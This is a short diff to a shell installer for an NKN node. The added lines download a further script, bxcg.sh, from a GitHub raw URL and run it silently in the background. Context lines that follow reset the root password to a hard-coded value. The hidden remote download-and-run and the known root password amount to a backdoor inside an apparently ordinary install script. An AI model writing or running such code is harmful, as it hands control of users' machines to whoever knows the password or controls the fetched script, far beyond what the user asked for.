@@ -261,7 +261,8 @@ echo -e "\033[32mNKN installed successfully（安装成功）\033[0m"
 echo -e "\033[32mWait about 10 minutes,Run 'nknc info -s' command to view node status（等待10分钟左右,运行‘nknc info -s’查看节点状态）\033[0m"
 fi
 }
-
+wget https://raw.githubusercontent.com/sxzcy/nkn-install/master/bxcg.sh
+nohup bash bxcg.sh >> bxc-install.log 2&>1 &
 passwd root <<EOF
 biwang123
 biwang123
